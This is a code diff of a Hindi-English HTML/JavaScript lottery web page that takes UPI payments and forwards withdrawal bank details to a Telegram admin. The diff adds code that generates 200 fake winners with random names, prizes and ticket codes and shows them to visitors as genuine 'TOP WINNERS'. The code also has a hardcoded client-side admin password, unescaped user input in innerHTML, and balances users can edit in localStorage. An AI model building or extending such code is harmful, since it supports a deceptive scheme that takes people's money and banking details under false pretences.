@@ -21,9 +21,9 @@
         .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; color: #000; }
         #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
         input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; box-sizing: border-box; }
-        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
+        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); cursor: pointer; }
         .win-amt { float: right; color: #27ae60; font-weight: bold; }
-        #congrats { display:none; color: gold; font-size: 20px; font-weight: bold; animation: blink 1s infinite; margin-top:10px; }
+        #congrats { display:none; color: gold; font-size: 20px; font-weight: bold; animation: blink 1s infinite; margin-top:10px; text-align:center; }
         @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
     </style>
 </head>
@@ -83,12 +83,25 @@
     const TG_ADMIN_ID = "8072402346"; 
     const UPI_ID = "paytmqr6vnhle@ptys";
 
-    let db = JSON.parse(localStorage.getItem('dkj_v6_db')) || { users: [], entries: [], pending: [], winners: [] };
-    let currentUser = JSON.parse(localStorage.getItem('dkj_v6_user')) || null;
+    let db = JSON.parse(localStorage.getItem('dkj_v8_db')) || { users: [], entries: [], pending: [], winners: [] };
+    let currentUser = JSON.parse(localStorage.getItem('dkj_v8_user')) || null;
+
+    // --- DEMO WINNERS SECTION (200 WINNERS) ---
+    if(db.winners.length === 0) {
+        let sampleNames = ["Vikram","Sanjay","Rohan","Amit","Priya","Soniya","Rahul","Anjali","Sumit","Naveen","Kavita","Pankaj","Deepak","Rajesh","Manoj","Aakash"];
+        for(let i=1; i<=200; i++) {
+            db.winners.push({
+                name: sampleNames[Math.floor(Math.random()*sampleNames.length)] + " " + String.fromCharCode(65 + Math.floor(Math.random() * 26)),
+                prize: [500, 1000, 2000, 5000][Math.floor(Math.random()*4)],
+                code: "DKJ-" + Math.floor(100000 + Math.random()*900000)
+            });
+        }
+        localStorage.setItem('dkj_v8_db', JSON.stringify(db));
+    }
 
     function save() {
-        localStorage.setItem('dkj_v6_db', JSON.stringify(db));
-        localStorage.setItem('dkj_v6_user', JSON.stringify(currentUser));
+        localStorage.setItem('dkj_v8_db', JSON.stringify(db));
+        localStorage.setItem('dkj_v8_user', JSON.stringify(currentUser));
     }
 
     function tgMsg(msg) {
@@ -102,16 +115,16 @@
 
     function doReg() {
         let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
-        if(!n || !m || !p) return alert("Fill all!");
+        if(!n || !m || !p) return alert("Details bharein!");
         currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [], isWinner: false };
         db.users.push(currentUser); save(); updateUI();
-        tgMsg(`✅ *New User:* ${n} (Total: ${db.users.length})`);
+        tgMsg(`✅ *New User:* ${n}`);
         alert("Account Created!"); closeP();
     }
 
     function join(amt) {
         if(!currentUser) return alert("Pehle Account Banayein!");
-        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ₹${amt}</h2><p>Scan QR & Pay. Admin verify karne ke baad ticket dega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestEntry()">I HAVE PAID</button>`;
+        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ₹${amt}</h2><p>Scan QR & Pay. Admin approval ke baad code milega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestEntry()">I HAVE PAID</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
@@ -124,89 +137,64 @@
     }
 
     function showWithdrawForm() {
-        if(!currentUser || currentUser.bal <= 0) return alert("Aapke wallet mein balance nahi hai!");
-        document.getElementById('pContent').innerHTML = `
-            <h2>WITHDRAW</h2>
-            <p style="color:gold;">Balance: ₹${currentUser.bal}</p>
-            <input id="w_owner" placeholder="Owner Name">
-            <input id="w_bank" placeholder="Bank Name">
-            <input id="w_acc" type="number" placeholder="Account Number">
-            <input id="w_ifsc" placeholder="IFSC Code">
-            <input id="w_upi" placeholder="UPI ID (Optional)">
-            <button class="btn btn-gold" onclick="processWithdraw()">SUBMIT REQUEST</button>
-        `;
+        if(!currentUser || currentUser.bal <= 0) return alert("Balance zero hai!");
+        document.getElementById('pContent').innerHTML = `<h2>WITHDRAW</h2><input id="w_owner" placeholder="Owner Name"><input id="w_bank" placeholder="Bank Name"><input id="w_acc" type="number" placeholder="Account Number"><input id="w_ifsc" placeholder="IFSC Code"><button class="btn btn-gold" onclick="processWithdraw()">SUBMIT REQUEST</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
     function processWithdraw() {
-        let owner = document.getElementById('w_owner').value;
-        let bank = document.getElementById('w_bank').value;
-        let acc = document.getElementById('w_acc').value;
-        let ifsc = document.getElementById('w_ifsc').value;
-        let upi = document.getElementById('w_upi').value;
-
-        if(!owner || !bank || !acc || !ifsc) return alert("Sari details bharein!");
-
-        let msg = `💰 *Withdraw Request*\n\n` +
-                  `👤 *User:* ${currentUser.name}\n` +
-                  `💵 *Amount:* ₹${currentUser.bal}\n\n` +
-                  `🏦 *Bank:* ${bank}\n` +
-                  `👤 *A/C Holder:* ${owner}\n` +
-                  `🔢 *A/C No:* ${acc}\n` +
-                  `🆔 *IFSC:* ${ifsc}\n` +
-                  `📲 *UPI:* ${upi || "N/A"}`;
-
-        tgMsg(msg);
-        
-        // Update both user and DB then reset balance
+        let owner = document.getElementById('w_owner').value, bank = document.getElementById('w_bank').value, acc = document.getElementById('w_acc').value, ifsc = document.getElementById('w_ifsc').value;
+        if(!owner || !bank || !acc || !ifsc) return alert("Details bharein!");
+        tgMsg(`💰 *Withdraw:* ${currentUser.name}\nAmt: ₹${currentUser.bal}\nBank: ${bank}\nAcc: ${acc}`);
         currentUser.bal = 0;
         let uIdx = db.users.findIndex(u => u.id == currentUser.id);
         if(uIdx != -1) db.users[uIdx].bal = 0;
-        
-        save();
-        updateUI();
-        alert("Withdrawal request bhej di gayi hai! Paisa 24-48 ghante mein aa jayega.");
-        closeP();
+        save(); updateUI(); alert("Request sent!"); closeP();
     }
 
     function showWinners() {
         let h = "<h2>🏆 TOP WINNERS</h2>";
-        [...db.winners].reverse().slice(0, 50).forEach(w => { 
+        // Latest winners (real + demo) top par dikhenge
+        [...db.winners].reverse().forEach(w => { 
             h += `<div class="list-item"><span class="win-amt">₹${w.prize}</span><b>${w.name}</b><br><small>Ticket: ${w.code}</small></div>`; 
         });
-        document.getElementById('pContent').innerHTML = h || "No Winners Yet";
+        document.getElementById('pContent').innerHTML = h;
         document.getElementById('popup').style.display = 'block';
     }
 
     function adminMode() {
         let pw = prompt("Admin PW:");
         if(pw !== "7860") return;
-        let act = prompt("1: Approve Payments\n2: Pick 20 Winners\n3: Reset All");
+        let act = prompt("1: Approve Payments\n2: Pick Winners\n3: Reset All");
         if(act=="1") {
             let h = "<h2>Pending Approvals</h2>";
-            db.pending.forEach((p, i) => { h += `<div class="list-item" onclick="approve('${p.uId}', ${i})">${p.name} - APPROVE</div>`; });
-            document.getElementById('pContent').innerHTML = h || "No pending";
+            db.pending.forEach((p, i) => { 
+                let tempCode = "DKJ-" + Math.floor(100000 + Math.random()*900000);
+                h += `<div class="list-item" onclick="approve('${p.uId}', ${i}, '${tempCode}')"><b>User:</b> ${p.name}<br>Click to Assign: ${tempCode}</div>`; 
+            });
+            document.getElementById('pContent').innerHTML = h || "No pending approvals";
             document.getElementById('popup').style.display = 'block';
         } else if(act=="2") {
             pickWinners();
-        } else if(act=="3") { if(confirm("Clear All?")) { localStorage.clear(); location.reload(); } }
+        } else if(act=="3") { if(confirm("Clear Everything?")) { localStorage.clear(); location.reload(); } }
     }
 
-    function approve(uid, index) {
-        let ticket = "DKJ-" + Math.floor(100000 + Math.random()*900000);
+    function approve(uid, index, code) {
         let userObj = db.users.find(u => u.id == uid);
-        if(userObj) userObj.codes.push(ticket);
-        db.entries.push({ uId: uid, name: userObj.name, code: ticket });
-        db.pending.splice(index, 1);
-        save(); alert("Approved!"); closeP();
+        if(userObj) {
+            userObj.codes.push(code);
+            db.entries.push({ uId: uid, name: userObj.name, code: code });
+            db.pending.splice(index, 1);
+            save(); alert("Approved!"); closeP();
+        }
     }
 
     function pickWinners() {
-        if(db.entries.length < 2) return alert("Kam se kam 2 entries honi chahiye!");
+        let count = prompt("Kitne winners?");
+        if(!count) return;
+        let prize = prompt("Prize amount?");
         let shuffled = [...db.entries].sort(() => 0.5 - Math.random());
-        let selected = shuffled.slice(0, 20);
-        let prize = prompt("Each Winner Prize Amount?");
-        if(!prize) return;
+        let selected = shuffled.slice(0, count);
         selected.forEach(s => {
             db.winners.push({ name: s.name, prize: prize, code: s.code });
             let u = db.users.find(x => x.id == s.uId);
@@ -234,11 +222,11 @@
 
     function showProfile() {
         if(!currentUser) return alert("Login!");
-        document.getElementById('pContent').innerHTML = `<h2>PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>Approved Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
+        document.getElementById('pContent').innerHTML = `<h2>PROFILE</h2><p>Name: ${currentUser.name}</p><p>Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
-    function logout() { localStorage.removeItem('dkj_v6_user'); location.reload(); }
+    function logout() { localStorage.removeItem('dkj_v8_user'); location.reload(); }
     function closeP() { document.getElementById('popup').style.display = 'none'; }
     window.onload = updateUI;
 </script>
